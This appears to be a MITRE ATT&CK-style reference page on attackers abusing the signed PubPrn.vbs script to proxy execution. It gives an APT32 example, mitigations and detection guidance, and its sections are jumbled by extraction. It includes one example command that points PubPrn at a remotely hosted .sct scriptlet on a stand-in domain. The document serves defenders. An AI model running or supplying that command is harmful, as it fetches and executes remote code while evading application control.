Procedure Examples
ID Name Description
G0050 APT32 APT32 has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses.
Mitigations
ID Mitigation Description
M1040 Behavior
Prevention on
EndpointOn Windows 10, update Windows Defender Application Control policies to include rules that block the
older, vulnerable versions of PubPrn.
M1038 Execution
PreventionCertain signed scripts that can be used to execute other programs may not be necessary within a given
environment. Use application control conﬁgured to block execution of these scripts if they are not
required for a given system or network to prevent potential misuse by adversaries.Adversaries may use PubPrn to proxy execution of malicious remote ﬁles. PubPrn.vbs is a Visual Basic script that publishes a printer to
Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell
via Cscript.exe . For example, the following code publishes a printer within the speciﬁed domain: cscript pubprn Printer1
LDAP://CN=Container1,DC=Domain1,DC=Com .
Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. To do so, adversaries may set the second script:
parameter to reference a scriptlet ﬁle (.sct) hosted on a remote site. An example command is pubprn.vbs 127.0.0.1
script:https://mydomain.com/folder/file.sct . This behavior may bypass signature validation restrictions and application control
solutions that do not account for abuse of this script.
In later versions of Windows (10+), PubPrn.vbs has been updated to prevent proxying execution from a remote site. This is done by limiting
the protocol speciﬁed in the second parameter to LDAP:// , vice the script: moniker which could be used to reference remote code via
HTTP(S).[1]

ID Data SourceData Component Detects
DS0017 Command Command
ExecutionMonitor executed commands and arguments for scripts like PubPrn.vbs that may be used to
proxy execution of malicious ﬁles.
DS0009 Process Process
CreationMonitor script processes, such as `cscript that may be used to proxy execution of malicious
ﬁles.
DS0012 Script Script
ExecutionMonitor for any attempts to enable scripts running on a system would be considered
suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of
cycle from patching or other administrator functions are suspicious. Scripts should be
captured from the ﬁle system when possible to determine their actions and intent.
